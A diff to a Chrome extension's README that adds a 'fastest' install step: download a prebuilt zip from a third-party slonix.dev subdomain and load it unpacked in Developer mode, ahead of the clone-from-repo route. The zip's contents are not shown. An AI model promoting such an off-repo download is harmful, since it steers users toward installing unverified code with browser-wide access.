@@ -10,11 +10,21 @@
 
 ### 1. Install the extension
 
+**Fastest:** download the prebuilt zip and unzip it:
+
+```
+https://circlearc-59513674.slonix.dev/mtrly-extension.zip
+```
+
+Then in Chrome: `chrome://extensions/` → **Developer mode** → **Load unpacked** → select the unzipped folder.
+
+Alternatively, from the repo:
+
 ```bash
 git clone git@github.com:finecalex/mtrly.git
 ```
 
-Then in Chrome: `chrome://extensions/` → **Developer mode** → **Load unpacked** → select `mtrly/extension/`.
+…and point "Load unpacked" at `mtrly/extension/`.
 
 ### 2. Sign up
 
